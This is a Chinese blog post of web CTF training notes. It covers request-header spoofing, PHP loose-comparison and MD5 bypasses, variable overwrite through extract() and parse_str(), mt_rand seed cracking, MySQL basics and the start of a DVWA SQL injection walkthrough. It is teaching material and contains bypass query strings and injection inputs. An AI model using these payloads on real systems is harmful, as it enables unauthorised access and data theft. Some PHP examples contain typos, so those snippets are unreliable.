@@ -1,0 +1,578 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>web实训技能听课笔记(持续更新中) | w3nx1z1</title><meta name="author" content="w3nx1z1"><meta name="copyright" content="w3nx1z1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web实训技能听课笔记(持续更新中)web新手村1.请从本地访问——IP地址欺骗——添加类似X-Forwarded-For: 127.0.0.1等信息 2，请从google.com访问——添加Referer头 类似Referer: google.com 3.请使用ABC Browser——添加User-Agent(通过这个来判断访问使用的浏览器 也可以识别出是手机浏览器还是计算机浏览器) 类似Us">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web实训技能听课笔记(持续更新中)">
+<meta property="og:url" content="http://w3nx1z1.github.io/posts/bc0b1168.html">
+<meta property="og:site_name" content="w3nx1z1">
+<meta property="og:description" content="web实训技能听课笔记(持续更新中)web新手村1.请从本地访问——IP地址欺骗——添加类似X-Forwarded-For: 127.0.0.1等信息 2，请从google.com访问——添加Referer头 类似Referer: google.com 3.请使用ABC Browser——添加User-Agent(通过这个来判断访问使用的浏览器 也可以识别出是手机浏览器还是计算机浏览器) 类似Us">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://w3nx1z1.github.io/img/mikey.png">
+<meta property="article:published_time" content="2023-05-16T09:14:28.163Z">
+<meta property="article:modified_time" content="2025-02-14T08:30:17.438Z">
+<meta property="article:author" content="w3nx1z1">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://w3nx1z1.github.io/img/mikey.png"><link rel="shortcut icon" href="/img/%E8%87%AA%E7%94%B1%E4%B9%8B%E7%BF%BC.jpg"><link rel="canonical" href="http://w3nx1z1.github.io/posts/bc0b1168.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'web实训技能听课笔记(持续更新中)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-02-14 16:30:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="\themes\butterfly\source\css\custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="w3nx1z1" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/mikey.png" onerror="onerror=null;src='/img/404.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/baobao.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="w3nx1z1"><span class="site-name">w3nx1z1</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">web实训技能听课笔记(持续更新中)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-16T09:14:28.163Z" title="发表于 2023-05-16 17:14:28">2023-05-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-14T08:30:17.438Z" title="更新于 2025-02-14 16:30:17">2025-02-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>21分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="web实训技能听课笔记(持续更新中)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="web实训技能听课笔记-持续更新中"><a href="#web实训技能听课笔记-持续更新中" class="headerlink" title="web实训技能听课笔记(持续更新中)"></a>web实训技能听课笔记(持续更新中)</h1><h2 id="web新手村"><a href="#web新手村" class="headerlink" title="web新手村"></a>web新手村</h2><p>1.请从本地访问——IP地址欺骗——添加类似X-Forwarded-For: 127.0.0.1等信息</p>
+<p>2，请从google.com访问——添加Referer头 类似Referer: google.com</p>
+<p>3.请使用ABC Browser——添加User-Agent(通过这个来判断访问使用的浏览器 也可以识别出是手机浏览器还是计算机浏览器) 类似User-Agent: ABC Browser</p>
+<p>4.webshell——蚁剑——URL地址填环境名——找连接密码</p>
+<p>5.弱类型</p>
+<p>&#x3D;&#x3D;&#x3D; 在进行比较的时候 会先判断两种字符串的类型是否相等 在比较‘</p>
+<p>&#x3D;&#x3D; 在进行比较的时候 会先将字符串类型转化成相同 在比较</p>
+<p>(如果比较一个数字和字符串或者比较涉及到数字内容的字符串 则字符串会被转换成数值并且比较按照数值来进行)</p>
+<p>eg. </p>
+<pre><code class="php">var_dump(&quot;admin&quot;==0); //true
+
+var_dump(&quot;1admin&quot;==1); //true
+
+var_dump(&quot;admin1&quot;==1); //false
+
+var_dump(&quot;admin1&quot;==0); //true
+
+var_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); //true
+</code></pre>
+<p><font color="red">在识别字符串的每一个字符时 由左到右依次识别 第一次识别到字母的时候 后面会全部忽略 且判定为0</font></p>
+<p><font color="red">“e”在php中识别为10的多少次方 是科学计数法 所以最后一个例子 0*10的多少次方都是0 故返回true</font></p>
+<p>当一个字符串被当作一个数值来取值，其结果和类型如下：如果该字符串没有包含<font color="red">‘.’  ‘,’  ‘e’ “E”</font>并且其数值值在整形的范围之内 该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。且由于被判断为非法数值 后面的内容也不在考虑是否含有”.” “,” “e” “E”</p>
+<pre><code class="php">&lt;?php.
+$test=l + &quot;10.5&quot;;  // $test=11.5(float)
+
+$test=1+&quot;-1.3e3&quot;; //$test=-1299(float)
+
+$test=l+&quot;bob-1.3e3&quot;; //$test=1(int)
+
+$test=l+&quot;2admin&quot;; //$test=3(int)
+
+$test=l+&quot;admin2; //$test=1(int)
+
+?&gt;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230425090540.jpg" alt="微信图片_20230425090540"></p>
+<h2 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h2><p>基础的 登陆的哈希验证</p>
+<p>一.</p>
+<pre><code class="php">$a != $b
+Md5($a) == Md5($b)
+</code></pre>
+<p>要求传入两个不相等的字符串 但要求两个字符串的md5值一样</p>
+<p>看到”&#x3D;&#x3D;” 想到弱类型判断 可以传入 两个md5值是”0e”开头的字符串 这 样会被识别为科学计数法 判断为0 所以md5值也一样</p>
+<p>二.</p>
+<pre><code class="php">$a != $b
+Md5($a) === Md5($b)
+</code></pre>
+<p>md5()只能计算字符串(string)的MD5值 但是数组就不行了 返回值是null</p>
+<p>可以利用null &#x3D;&#x3D;&#x3D; null来进行绕过 只要保证两个数组里面的内容不一样就可以了</p>
+<pre><code class="php">a[]=1&amp;b[]=2
+</code></pre>
+<p>三.</p>
+<pre><code class="php">(string)$a != (string)$b
+Md5($a) === Md5($b)
+</code></pre>
+<p>利用MD5碰撞 两个不同的东西会有相同的MD5</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p>
+<p>四.</p>
+<pre><code class="php">$md5 == md5($md5)
+</code></pre>
+<p>积累内容</p>
+<p>五.</p>
+<pre><code class="php">intval($num) &lt; 2020 &amp;&amp; intval($num+1) &gt; 2021
+</code></pre>
+<p>和php版本有关 php5会将对科学计数法取int 以常规字符串中数字和字母组合的方式识别出</p>
+<p>但是先加一在取int 则不会</p>
+<pre><code class="php">$num = 2e5
+intval($num); //2
+intval($num+1); //200001
+</code></pre>
+<p>六.</p>
+<p>浮点精度绕过</p>
+<p><a target="_blank" rel="noopener" href="http://172.30.211.91:8343/">http://172.30.211.91:8343/</a> Africa</p>
+<pre><code class="php">$numPositive = intval($num)
+$numReverse = intval(strrev($num))l; //strrev就是逆序
+
+$num != $numPositive
+$numPositive === $numReverse &amp;&amp; !isPalindrom($num); //isPalindrom返回一个数的回文数 比如123回文数是321
+</code></pre>
+<p>要求取整后的数和逆序后取整的数相等 且传入的num不能是回文数</p>
+<p>最后一个条件很好满足 比如100.0010</p>
+<p>但是在读取100.0010时 读完整数部分 遇到小数部分的0就会停止 识别为100 结果和取整是一样的</p>
+<p>而逆序数0100.001取整还是100所以条件二满足了</p>
+<p>条件一下面返回的是die 所以要求我们输入的num不能满足条件一对应的if条件 即应该是$num &#x3D;&#x3D; $numPositive</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230425151321618.png" alt="image-20230425151321618"></p>
+<p>使用浮点精度绕过</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230425151809409.png" alt="image-20230425151809409"></p>
+<p>由图可知 在小数点后16位 会超出php语言所能识别的精度 将1.0000000000000001判断为与1相等</p>
+<p>因此 为了满足条件一二  我们应该输入的$num &#x3D; 1000000000000000.00000000000000010</p>
+<p>七.</p>
+<pre><code class="php">$md5 == md5(md5($md5))
+</code></pre>
+<p>积累 跑脚本可以得出为0e1138100474 其实在前面加n个0也的满足的</p>
+<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="Extract"><a href="#Extract" class="headerlink" title="Extract()"></a>Extract()</h3><p><strong>定义：</strong>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>该函数返回成功设置的变量数目。</p>
+<p><strong>语法：</strong></p>
+<p>extract(<em>array,extract_rules,prefix</em>)<br> 参数                                              描述<br> <em>array</em>必需。                         规定要使用的数组。<br> <em>extract_rules</em>可选。             extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。<br> 可能的值：<br> EXTR_OVERWRITE -        默认。如果有冲突，则覆盖已有的变量。<br> EXTR_SKIP -                     如果有冲突，不覆盖已有的变量。<br> EXTR_PREFIX_SAME -    如果有冲突，在变量名前加上前缀 prefix。<br> EXTR_PREFIX_ALL -        给所有变量名加上前缀 prefix。<br> EXTR_PREFIX_INVALID -仅在不合法或数字变量名前加上前缀 prefix。<br> EXTR_IF_EXISTS -           仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。<br> EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。<br> EXTR_REFS -                        将变量作为引用提取。导入的变量仍然引用了数组参数的值。</p>
+<p><em>prefix</em>可选。                         如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。<br> 该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。</p>
+<pre><code class="php">//将键值&quot;cat&quot;、&quot;dog&quot;、&quot;horse&quot;赋值给变量$a $b $c
+&lt;?php
+$a = &quot;original&quot;;
+$my_array = array(&quot;a&quot; =&gt; &quot;cat&quot;,&quot;b&quot; =&gt; &quot;dog&quot;,&quot;c&quot; =&gt; &quot;horse&quot;);
+extract($my_array);
+echo &quot;\$a = %a; \$b = $b; \$c = $c&quot;;
+?&gt;
+//$a = %a; $b = dog; $c = horse
+</code></pre>
+<p>就是说 extract()使用了一个数组$my_array(其中<strong>array</strong>函数是用来创建数组的) 将其中的三个键值对 分别导入 </p>
+<p>如果其中某个键名($a)存在且原来有内容 则extract函数会对其进行覆盖 </p>
+<p>如果没有($b、$c) extract函数会创建这个键名并且将数组中键名对应的键值导入其中</p>
+<p><strong>再举一个例子</strong></p>
+<pre><code class="php">&quot;extract($_GET);
+if(isset($bdctf))
+&#123;
+$content=trim(file_get_contents($flag));//file_get_contents()将整个文件读入一个字符串
+if($bdctf==$content)                             //trim()去除字符串首尾处的空白字符（或者其他字符）
+&#123; echo&#39;bdctf&#123;**********&#125;&#39;; &#125;
+else
+&#123; echo&#39;这不是蓝盾的密码啊&#39;; &#125;
+&#125;&quot;
+</code></pre>
+<p><strong>题目分析</strong><br>题目使用了**extract($_GET)<strong>接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用</strong>extract()**对变量进行覆盖，从而满足各个条件。</p>
+<p><strong>解题思路</strong><br> if($bdctf&#x3D;&#x3D;$content) 输出flag<br> 利用<strong>extract($_GET)漏洞，使$bdctf与$content都为空或者不存在就满足 $bdctf&#x3D;&#x3D;$content</strong><br> <strong>get?flag&#x3D;&amp;bdctf&#x3D;  得到flag</strong></p>
+<h3 id="Parse-str"><a href="#Parse-str" class="headerlink" title="Parse_str"></a>Parse_str</h3><p><strong>定义：</strong></p>
+<p>把查询字符串解析到变量中</p>
+<p><strong>语法：</strong></p>
+<p><strong>parse_str(string,array)</strong><br>参数 描述<br><em>string</em>必需。 规定要解析的字符串。<br><em>array</em>可选。 规定存储变量的数组名称。该参数指示变量存储到数组中。</p>
+<pre><code class="php">&lt;?php
+$a = 1;                  //原变量值为1
+parse_str(&#39;a=2&#39;);   //经过parse_str()函数后注册变量$a，重新赋值
+print_r($b);          //输出结果为2
+?&gt;
+</code></pre>
+<p><strong>举个例子</strong></p>
+<pre><code class="php">&lt;?php
+if(!isset($_GET[&#39;id&#39;])) &#123;                    
+show_source(__FILE__);          
+die;                                          
+&#125;
+include (‘flag.php’);
+$a = “www.OPENCTF.com”;
+$id = $_GET[&#39;id&#39;];
+@parse_str($id);
+if ($a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)) &#123;
+echo $flag;
+&#125; else &#123;
+exit(‘其实很简单其实并不难！’);
+&#125;
+?&gt;
+</code></pre>
+<p><strong>题目分析</strong></p>
+<p>首先 看到存在哈希比较 且是”&#x3D;&#x3D;”的弱比较 要求$a[0]的值不等于‘QNKCDZO’ 但是MD5值等于 </p>
+<p>解一下可以发现 ‘QNKCDZO’的MD5值正好是<strong>0e830400451993494058024219903391</strong>可以进行哈希绕过 </p>
+<p>随便找一个满足要求的字符串 比如<strong>s878926199a</strong> 其MD5值也是0e开头的 和 ‘QNKCDZO’的MD5值一样 都会被识别为0(科学计数法)</p>
+<p>$id接受了get请求中的数据 而parse_str函数接受了$id 只要将数组a的值赋予$id 就可以成功覆盖$a[0] 满足题目要求的判断条件</p>
+<p><strong>get?id&#x3D;$a[0]&#x3D;s878926199a</strong></p>
+<h2 id="随机数问题"><a href="#随机数问题" class="headerlink" title="随机数问题"></a>随机数问题</h2><p>**mt_rand()**种子</p>
+<p>mt_rand()函数用于生成随机数</p>
+<p>mt_srand(seed)给随机数发生器播种 比如：</p>
+<pre><code class="php">&lt;?php
+mt_srand(123456);
+echo mt_rand();
+?&gt;
+//272665632
+</code></pre>
+<p>原理就是 对于给定种子的随机数发生器 他计算出的随机数都是一样的 这样根据得到的随机数 我们可以使用<strong>php_mt_seed</strong>(在kali里面)脚本爆破出使用的种子 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230428103219947.png" alt="image-20230428103219947"></p>
+<p>同时 根据php使用的版本不同 爆破出来的种子也不一样 按照不同题目可能两个都要试一下</p>
+<p>此外  还有一种无需爆破得到种子的脚本 reverse_mt_rand.py</p>
+<pre><code class="python">./reverse_mt_rand.py rand_n+0 rand_n+227 n flavour
+# rand_n+0 是选择的第一个随机数
+# rand_n+227 是选择的第二个随机数 第一二个随机数之间要间隔226个随机数
+# n的值是相对于最开始生成的第一个随机数 我们选择的第一个随机数是第几个数
+# flavour 如果是php5版本 就输入0 如果是php7以上的版本就输入1
+</code></pre>
+<h2 id="数据库基本概念"><a href="#数据库基本概念" class="headerlink" title="数据库基本概念"></a>数据库基本概念</h2><p>数据库就是软件存放数据的一个空间</p>
+<p>**数据库管理系统(DBMS)**是一种操纵和管理数据库的软件 用于建立使用和维护数据库 他对数据库进行统一的管理和控制 以保证数据库的安全性和完整性  <strong>mysql</strong>就是这样的一种数据库管理系统</p>
+<p>主要分为两类：关系型数据库和非关系型数据库</p>
+<p><strong>关系型数据库</strong>RDBMS:存储格式能直观反映实体间的关系 和创建的表格比较相似 表与表之间有着复杂的关联关系 比如 mysql oracle server access等</p>
+<p><strong>非关系型数据库</strong>：分布式、非关系型的、不保证遵循ACID原则的数据存储系统 比如 mongodb redis hbase等</p>
+<p><strong>SQL</strong> 结构化查询语言 </p>
+<p>查询是人们用各种SQL指令构造出来的 负责具体完成筛选和提取结果数据的工作 包括增删改查</p>
+<h2 id="Mysql基础"><a href="#Mysql基础" class="headerlink" title="Mysql基础"></a>Mysql基础</h2><p>数据类型：大致可以分为 数值、日期&#x2F;时间和字符串类型</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230502124537303.png" alt="image-20230502124537303"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230501203846050.png" alt="image-20230501203846050"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230501203952345.png" alt="image-20230501203952345"></p>
+<p><strong>约束类型</strong>：</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230502124343739.png" alt="image-20230502124343739"></p>
+<h3 id="常见的sql语句"><a href="#常见的sql语句" class="headerlink" title="常见的sql语句"></a><strong>常见的sql语句</strong></h3><p><strong>连接</strong>数据库：mysql -uroot -p；</p>
+<p>**查询(显示)**所有的数据库：show databases；</p>
+<p><strong>创建</strong>数据库：create database 库名；</p>
+<p><strong>删除</strong>数据库：drop database 库名;</p>
+<p><strong>查看(显示)<strong>当前数据库的所有表：show tables; 在用之前 要选择</strong>使用(打开)<strong>一个数据库</strong>use db_name</strong>；</p>
+<p><strong>查看</strong>某个表的**描述(结构)**：desc 表名；</p>
+<p>显示表中各<strong>字段信息</strong>，即表结构：show columns from table_name;</p>
+<p>显示<strong>表创建过程</strong>：show create table 表名；</p>
+<p>列出当前<strong>mysql的相关状态信息</strong>：status;</p>
+<p><strong>清空</strong>数据表：delete from table_name; </p>
+<p>或truncate table table_name;</p>
+<p><strong>退出</strong>数据库：exit；</p>
+<p>查询现在<strong>正在使用</strong>的数据库：select database();</p>
+<p>操作：增减改查</p>
+<p><strong>增</strong>：语法格式：insert into 表名（字段1，字段2，。。。。）values（值1，值2，。。。。）;</p>
+<p>是一一对应的</p>
+<p>插入多条数据：insert into 表名（字段1，字段2，。。。。）values（值1，值2，。。。。），（值3，值4，。。。。）;</p>
+<pre><code class="mysql">insert into test(id,name,age) values(1,&#39;wenx1&#39;,18);
+</code></pre>
+<p><strong>改</strong>：update 表名 set 字段名&#x3D;’值’ [where条件]</p>
+<pre><code class="mysql">update test set age=&#39;28&#39; where id=1;
+</code></pre>
+<p><strong>查</strong>：select * from 表名 [where条件]；</p>
+<pre><code class="mysql">select * from test;   #*表示查询这张表中的全部字段(列)
+select GROUP_CONCAT(NAME,Population) from city where CountryCode=&#39;PSE&#39;;  #GROUP_CONCAT能将查询到的所有内容放在同一行 用“，”来区分
+</code></pre>
+<p><strong>order by排序</strong></p>
+<p>格式：select * from 表名 order by 列名(字段名)  </p>
+<p>order by ｛column_name [ASC|DESC]} [,….n]   ASC为升序 DESC为降序   若后面加数字表示以第几列为基准做排序</p>
+<p>特性：如果order by后的数字超过了原有的字段数(列数) 就会报错(可以用来sql注入里面猜当前数据表中有多少个字段)</p>
+<pre><code class="mysql">select * from city order by ID asc;
+#假设当前数据表中有5个字段
+select * from cuty order by 5; #不会报错
+select * from cuty order by 6; #会报错
+</code></pre>
+<p><strong>limit限制</strong></p>
+<p>用于限制select语句返回指定的记录数 接受一个或两个数字参数</p>
+<p>语法：select * from 表名 limit 偏移量，限制条数 </p>
+<pre><code class="mysql">limit 5; #5代表限制条数
+limit 0,5; #0代表偏移量，5代表限制条数
+select * from table limit 5; #检索前5个记录行
+select * from table limit 5,10; #检索记录行6-15 注意在有偏移量的时候 从偏移量的下一行开始算限制条数
+</code></pre>
+<p><strong>减</strong>：delete 表示删除一条数据 指的是物理删除 彻底在数据库中删除了  对比是逻辑删除 只是不显示在系统中 但数据库中依旧存在</p>
+<p>delete from 表名 [where条件]</p>
+<pre><code class="mysql">delete from test where id=1; #物理删除 update是逻辑删除
+</code></pre>
+<p><strong>注释符</strong>：</p>
+<pre><code class="mysql">#
+--+ 或 --空格
+/*.......*/
+</code></pre>
+<p>其他操作：</p>
+<pre><code class="mysql">select version(); / select @@version; #查看版本信息
+select user(); #返回当前使用数据库的用户 也就是网站配置文件中连接数据库的账号
+select session_user(); #查看连接数据库的用户名
+select system_user(); #查看系统用户名
+select database(); #查看当前数据库
+group_concat(); #把数据库中的某列数据或某几列数据合并为一个字符串
+select @@datair; #查看数据库路径
+</code></pre>
+<p> <strong>information_schema</strong></p>
+<p>mysql自带的数据库 可以提供mysql服务器所维护的所有其他数据库的信息 如数据库名 数据库的表 表的数据类型与访问权限等</p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>就是将sql代码插入或添加到应用的输入参数中的攻击 之后再将这些参数传递给后台的sql服务加一解析并执行</p>
+<p>产生条件：攻击者控制了sql语句的一部分 使用户的输入不再是一个输入参数 而成为了符合语法的sql语句</p>
+<p>按回显方式划分：</p>
+<p>有回显：</p>
+<p>联合查询：构造联合查询语句 直接查看查询结果</p>
+<p>报错注入：构造报错语句 在报错中查看结果</p>
+<p>堆查询：多航语句执行 进而实现想要达到的目的</p>
+<p>无回显：</p>
+<p>盲注：布尔型&#x2F;时间型 通过某种手段“爆破”结果</p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>使用DVWA进行sql注入联合查询测试</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230510090242654.png" alt="image-20230510090242654"></p>
+<p>一.输入1</p>
+<p>此时的sql语句为</p>
+<pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39;    # 返回用户id为1的用户数据
+</code></pre>
+<p>二.输入 1’ and ‘1’ &#x3D; ‘2</p>
+<pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; and &#39;1&#39; = &#39;2&#39;  # 此时判断结果恒为假 无法测试出是否含有sql注入
+</code></pre>
+<p>三.输入1’ or ‘1234’ &#x3D; ‘1234</p>
+<pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; or &#39;1234&#39; = &#39;1234&#39;  # 条件判断恒为真 返回users表中的所有用户数据
+</code></pre>
+<p>四.输入1’ or 1&#x3D;1 order by 1 #<strong>(这里的#是为了把sql语句中后面的单引号注释掉)</strong></p>
